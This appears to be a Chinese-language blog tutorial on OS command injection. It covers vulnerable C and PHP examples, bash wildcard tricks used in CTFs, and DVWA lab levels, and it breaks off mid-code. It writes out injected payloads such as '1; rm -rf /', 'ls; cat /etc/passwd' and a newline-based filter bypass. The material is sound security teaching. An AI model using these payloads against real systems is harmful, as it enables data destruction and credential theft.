+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ ./catWrapper <span class="string">&quot;Story.txt; ls&quot;</span></span><br><span class="line">When last we left our heroes...</span><br><span class="line">Story.txt               doubFree.c              nullpointer.c</span><br><span class="line">unstosig.c              www*                    a.out*</span><br><span class="line">format.c                strlen.c                useFree*</span><br><span class="line">catWrapper*             misnull.c               strlength.c             useFree.c</span><br><span class="line">commandinjection.c      nodefault.c             trunc.c                 writeWhatWhere.c</span><br></pre></td></tr></table></figure>
+
+<p>如果将<code>catWrapper</code>设置为具有比标准用户更高的权限级别，则可以使用该更高权限执行任意命令。</p>
+<h4 id="Example-2"><a href="#Example-2" class="headerlink" title="Example 2"></a>Example 2</h4><p>以下简单程序接受文件名作为命令行参数，并将文件的内容显示给用户。 该程序安装了<code>setuid root</code>，假设原本它旨在用作学习工具，允许系统管理员在培训中检查特权系统文件，而不会让他们修改它们或损坏系统。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">char</span>* argc, <span class="keyword">char</span>** argv)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> cmd[CMD_MAX] = <span class="string">&quot;/usr/bin/cat &quot;</span>;</span><br><span class="line">    <span class="built_in">strcat</span>(cmd, argv[<span class="number">1</span>]);</span><br><span class="line">    system(cmd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于程序以<code>root</code>权限运行，因此对<code>system()</code>的调用也以<code>root</code>权限执行。 如果用户指定标准文件名，则程序调用会按预期工作。 但是，如果攻击者传递<code>1; rm -rf /</code>形式的字符串，无论当前目录是否有<code>1</code>这个文件，都会继续向下执行<code>rm -rf /</code>。</p>
+<h4 id="Example-3"><a href="#Example-3" class="headerlink" title="Example 3"></a>Example 3</h4><p>本例中，本程序拥有对应的权限，使用环境变量<code>$APPHOME</code>来确定应用程序的安装目录，然后在该目录中执行初始化脚本</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span>* home=getenv(<span class="string">&quot;APPHOME&quot;</span>);</span><br><span class="line"><span class="keyword">char</span>* cmd=(<span class="keyword">char</span>*)<span class="built_in">malloc</span>(<span class="built_in">strlen</span>(home)+<span class="built_in">strlen</span>(INITCMD));</span><br><span class="line"><span class="keyword">if</span> (cmd) &#123;</span><br><span class="line">    <span class="built_in">strcpy</span>(cmd,home);</span><br><span class="line">    <span class="built_in">strcat</span>(cmd,INITCMD);</span><br><span class="line">    execl(cmd, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本例前提与<code>Example 2</code>中一样，此示例中的代码允许攻击者使用应用程序的提升权限执行任意命令。在此示例中，攻击者可以修改环境变量<code>$APPHOME</code>通过制定不同的路径以使用含有恶意代码的<code>INITCMD</code>。 由于程序不验证从<code>getenv()</code>读取的值，因此通过控制环境变量，攻击者可以欺骗应用程序运行恶意代码。</p>
+<p>攻击者使用环境变量来控制程序调用的命令，因此在此示例中环境变量的影响是非常巨大的。</p>
+<h4 id="Example-4"><a href="#Example-4" class="headerlink" title="Example 4"></a>Example 4</h4><p>下面的代码来自基于<code>Web</code>的<code>CGI</code>实用程序，允许用户更改其密码。 NIS下的密码更新过程包括在<code>/var/yp</code>目录中运行<code>make</code>。 请注意，由于程序更新密码记录，因此已安装<code>setuid root</code>。函数对<code>make</code>调用如下：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">system(<span class="string">&quot;cd /var/yp &amp;&amp; make &amp;&gt; /dev/null&quot;</span>);</span><br></pre></td></tr></table></figure>
+
+<p>与前面的示例不同，此示例中的命令是没有可控输入的硬编码，因此攻击者无法控制传递给<code>system()</code>的参数。但是，由于程序没有为make指定绝对路径，并且在调用命令之前没有擦除任何环境变量，因此攻击者可以修改其<code>$PATH</code>变量以指向名为<code>make</code>的恶意二进制文件，并从中执行<code>CGI</code>脚本。<code>shell</code>提示。由于该程序已经安装了<code>setuid root</code>，因此攻击者的<code>make</code>版本现在以<code>root</code>权限运行。</p>
+<p>环境在程序中执行系统命令方面发挥着重要作用。<code>system()</code>和<code>exec()</code>之类的函数使用调用它们的程序环境，因此攻击者有可能影响这些调用的行为。</p>
+<p>有很多文章会提到<code>Java</code>的<code>Runtime.exec</code>与<code>C</code>的系统功能完全相同。其实不然。虽然两者都允许调用新的程序/进程，但是，<code>C</code>的系统函数将其参数传递给要解析的<code>shell(/bin/sh)</code>，而<code>Runtime.exec</code>尝试将字符串拆分为单词数组，然后使用其余单词执行数组中的第一个单词作为参数。<code>Runtime.exec</code>不会尝试在任何时候调用<code>shell</code>。关键的区别在于<code>shell</code>提供的大部分功能可被恶意利用的点（例如<code>＆</code>，<code>&amp;&amp;</code>，<code>|</code>，<code>||</code>等链接命令，重定向输入和输出）将简单地结束作为传递给第一个命令的参数，可能导致语法错误，或被抛出作为无效参数。</p>
+<h4 id="Example-5"><a href="#Example-5" class="headerlink" title="Example 5"></a>Example 5</h4><p>以下简单的代码片段易受<code>Unix/Linux</code>平台上的OS命令注入攻击：</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">     <span class="keyword">char</span> command[<span class="number">256</span>];</span><br><span class="line"></span><br><span class="line">     <span class="keyword">if</span>(argc != <span class="number">2</span>) &#123;</span><br><span class="line">          <span class="built_in">printf</span>(<span class="string">&quot;Error: Please enter a program to time!\n&quot;</span>);</span><br><span class="line">          <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">     &#125;</span><br><span class="line"></span><br><span class="line">     <span class="built_in">memset</span>(&amp;command, <span class="number">0</span>, <span class="keyword">sizeof</span>(command));</span><br><span class="line"></span><br><span class="line">     <span class="built_in">strcat</span>(command, <span class="string">&quot;time ./&quot;</span>);</span><br><span class="line">     <span class="built_in">strcat</span>(command, argv[<span class="number">1</span>]);</span><br><span class="line"></span><br><span class="line">     system(command);</span><br><span class="line">     <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>如果这是一个<code>suid</code>二进制文件，请考虑攻击者输入以下内容的情况:<code>ls; cat /etc/passwd</code>。 在Unix环境中，<code>shell</code>命令用分号分隔。 我们现在可以随意执行系统命令！</p>
+<h4 id="Example-6"><a href="#Example-6" class="headerlink" title="Example 6"></a>Example 6</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;Please specify the name of the file to delete&quot;</span>);</span><br><span class="line">    <span class="keyword">print</span>(<span class="string">&quot;&lt;p&gt;&quot;</span>);</span><br><span class="line">    <span class="variable">$file</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line">    system(<span class="string">&quot;rm <span class="subst">$file</span>&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>以下成功攻击的示例：</p>
+<p>Request:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;127.0.0.1&#x2F;delete.php?filename&#x3D;bob.txt;id</span><br></pre></td></tr></table></figure>
+
+<p>Response:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Please specify the name of the file to delete</span><br><span class="line"></span><br><span class="line">uid&#x3D;33(www-data) gid&#x3D;33(www-data) groups&#x3D;33(www-data) </span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="再举个🌰"><a href="#再举个🌰" class="headerlink" title="再举个🌰"></a>再举个🌰</h3><h4 id="的使用"><a href="#的使用" class="headerlink" title="?的使用"></a>?的使用</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">$ cat /fl??</span><br><span class="line">NUAACTF&#123;56723419231&#125;</span><br><span class="line"></span><br><span class="line">$ cat /???/??ss</span><br><span class="line">daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin</span><br><span class="line">bin:x:2:2:bin:/bin:/usr/sbin/nologin</span><br><span class="line">sys:x:3:3:sys:/dev:/usr/sbin/nologin</span><br><span class="line">sync:x:4:65534:sync:/bin:/bin/sync</span><br><span class="line">games:x:5:60:games:/usr/games:/usr/sbin/nologin</span><br><span class="line">man:x:6:12:man:/var/cache/man:/usr/sbin/nologin</span><br><span class="line">lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin</span><br><span class="line">mail:x:8:8:mail:/var/mail:/usr/sbin/nologin</span><br><span class="line">news:x:9:9:news:/var/spool/news:/usr/sbin/nologin</span><br><span class="line">uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin</span><br><span class="line">proxy:x:13:13:proxy:/bin:/usr/sbin/nologin</span><br><span class="line">www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin</span><br><span class="line">backup:x:34:34:backup:/var/backups:/usr/sbin/nologin</span><br><span class="line">list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin</span><br><span class="line">irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin</span><br><span class="line">gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin</span><br><span class="line">nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin</span><br><span class="line">systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin</span><br><span class="line">_apt:x:102:65534::/nonexistent:/usr/sbin/nologin</span><br><span class="line">systemd-timesync:x:103:107:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin</span><br></pre></td></tr></table></figure>
+
+<h4 id="…-的使用"><a href="#…-的使用" class="headerlink" title="[…]的使用"></a>[…]的使用</h4><p><code>[...]</code>匹配方括号之中的任意一个字符，比如<code>[aeiou]</code>可以匹配五个元音字母。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 存在文件 a.txt 和 b.txt 和 c.txt 和 ab.txt</span></span><br><span class="line">$ ls [ab].txt</span><br><span class="line">a.txt b.txt</span><br><span class="line"></span><br><span class="line">$ ls *[ab].txt</span><br><span class="line">ab.txt a.txt b.txt</span><br><span class="line"></span><br><span class="line">$ ls [a-c].txt</span><br><span class="line">a.txt b.txt c.txt</span><br><span class="line"></span><br><span class="line">$ ls *[a-c].txt</span><br><span class="line">a.txt ab.txt abc.txt b.txt c.txt</span><br></pre></td></tr></table></figure>
+
+<h4 id="…-的使用-1"><a href="#…-的使用-1" class="headerlink" title="{…}的使用"></a>{…}的使用</h4><p><code>&#123;...&#125;</code> 表示匹配大括号里面的所有模式，模式之间使用逗号分隔。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">$ <span class="built_in">echo</span> d&#123;a,e,i,u,o&#125;g</span><br><span class="line">dag deg dig dug dog</span><br><span class="line"></span><br><span class="line"><span class="comment">#	大括号可以嵌套使用</span></span><br><span class="line">$ <span class="built_in">echo</span> &#123;j&#123;p,pe&#125;g,png&#125;</span><br><span class="line">jpg jpeg png</span><br><span class="line"></span><br><span class="line"><span class="comment">#	&#123;start..end&#125;匹配连续字符</span></span><br><span class="line">$ cat /f&#123;0..z&#125;ag</span><br><span class="line">NUAACTF&#123;56723419231&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>&#123;...&#125;</code>与<code>[...]</code>有一个很重要的区别。如果匹配的文件不存在，<code>[...]</code>会失去模式的功能，变成一个单纯的字符串，而<code>&#123;...&#125;</code>依然可以展开。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 不存在 a.txt 和 b.txt</span></span><br><span class="line">$ ls [ab].txt</span><br><span class="line">ls: [ab].txt: No such file or directory</span><br><span class="line"></span><br><span class="line">$ ls &#123;a,b&#125;.txt</span><br><span class="line">ls: a.txt: No such file or directory</span><br><span class="line">ls: b.txt: No such file or directory</span><br></pre></td></tr></table></figure>
+
+
+
+<h4 id="Tips"><a href="#Tips" class="headerlink" title="Tips"></a>Tips</h4><p>在使用过程中应该注意：</p>
+<ol>
+<li><p>通配符是先解释，再执行。</p>
+<p>Bash 接收到命令以后，发现里面有通配符，会进行通配符扩展，然后再执行命令。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls a*.txt</span><br><span class="line">ab.txt</span><br><span class="line"></span><br><span class="line"><span class="comment">#	上面命令的执行过程是，Bash 先将a*.txt扩展成ab.txt，然后再执行ls ab.txt。</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>通配符不匹配，会原样输出。</p>
+<p>Bash 扩展通配符的时候，发现不存在匹配的文件，会将通配符原样输出。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ ls *.csv</span><br><span class="line">ls: *.csv: No such file or directory</span><br><span class="line"></span><br><span class="line"><span class="comment">#	另外，前面已经说过，这条规则对&#123;...&#125;不适用</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>只适用于单层路径。</p>
+<p>上面所有通配符只匹配单层路径，不能跨目录匹配，即无法匹配子目录里面的文件。或者说，<code>?</code>或<code>*</code>这样的通配符，不能匹配路径分隔符（<code>/</code>）。</p>
+<p>如果要匹配子目录里面的文件，可以写成下面这样。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ ls */*.txt</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>可用于文件名。</p>
+<p>Bash 允许文件名使用通配符。这时，引用文件名的时候，需要把文件名放在单引号里面。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$ touch <span class="string">&#x27;fo*&#x27;</span></span><br><span class="line">$ ls</span><br><span class="line">fo*</span><br><span class="line"></span><br><span class="line"><span class="comment">#	上面代码创建了一个fo*文件，这时*就是文件名的一部分。</span></span><br></pre></td></tr></table></figure>
+
+
+
+
+</li>
+</ol>
+<h3 id="运用"><a href="#运用" class="headerlink" title="运用"></a>运用</h3><p>以<code>DVWA</code>为例</p>
+<h4 id="Command-Injection-low"><a href="#Command-Injection-low" class="headerlink" title="Command Injection: low"></a>Command Injection: low</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// Windows </span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// *nix </span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>这里没有对<code>ip</code>进行输入检测，所以我们可以使用<code>;cmd</code>的方式进行命令注入。</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fykpgyazsuj213i0x6491.jpg"></p>
+<p>####Command Injection: medium</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist </span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>( </span><br><span class="line">        <span class="string">&#x27;&amp;&amp;&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">    ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist). </span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// Windows </span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// *nix </span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>这里仅仅只是增加了<code>&amp;&amp;</code>与<code>;</code>两个的过滤。然而我们仍然可以使用<code>|</code>来进行绕过。</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fykpgyazsuj213i0x6491.jpg"></p>
+<p>####Command Injection: high</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$target</span> = trim(<span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set blacklist </span></span><br><span class="line">    <span class="variable">$substitutions</span> = <span class="keyword">array</span>( </span><br><span class="line">        <span class="string">&#x27;&amp;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;;&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;| &#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;-&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;$&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;(&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;)&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;`&#x27;</span>  =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">        <span class="string">&#x27;||&#x27;</span> =&gt; <span class="string">&#x27;&#x27;</span>, </span><br><span class="line">    ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Remove any of the charactars in the array (blacklist). </span></span><br><span class="line">    <span class="variable">$target</span> = str_replace( array_keys( <span class="variable">$substitutions</span> ), <span class="variable">$substitutions</span>, <span class="variable">$target</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Determine OS and execute the ping command. </span></span><br><span class="line">    <span class="keyword">if</span>( stristr( php_uname( <span class="string">&#x27;s&#x27;</span> ), <span class="string">&#x27;Windows NT&#x27;</span> ) ) &#123; </span><br><span class="line">        <span class="comment">// Windows </span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span> &#123; </span><br><span class="line">        <span class="comment">// *nix </span></span><br><span class="line">        <span class="variable">$cmd</span> = shell_exec( <span class="string">&#x27;ping  -c 4 &#x27;</span> . <span class="variable">$target</span> ); </span><br><span class="line">    &#125; </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Feedback for the end user </span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$cmd&#125;</span>&lt;/pre&gt;&quot;</span>; </span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
+
+<p>这里仔细观察，其实<code>|</code>管道符这里有一个空格，所以我们<code>medium</code>的<code>payload</code>还可以继续使用，但是如果真的过滤了<code>|</code>怎么办呢。我们其实还可以抓包加入<code>%0a</code>换行符进行一个绕过。使用<code>127.0.0.1 %0acat /etc/passwd</code>进行绕过</p>
+<p><img src="https://ws1.sinaimg.cn/large/64ef14dcgy1fykptasckdj21yw18saov.jpg"></p>
+<h4 id="Command-Injection-impossible"><a href="#Command-Injection-impossible" class="headerlink" title="Command Injection: impossible"></a>Command Injection: impossible</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Submit&#x27;</span> ]  ) ) &#123; </span><br><span class="line">    <span class="comment">// Check Anti-CSRF token </span></span><br><span class="line">    checkToken( <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;user_token&#x27;</span> ], <span class="variable">$_SESSION</span>[ <span class="string">&#x27;session_token&#x27;</span> ], <span class="string">&#x27;index.php&#x27;</span> ); </span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get input </span></span><br><span class="line">    <span class="variable">$target</span> = <span class="variable">$_REQUEST</span>[ <span class="string">&#x27;ip&#x27;</span> ]; </span><br><span class="line">    <span class="variable">$target</span> = stripslashes( <span class="variable">$target</span> ); 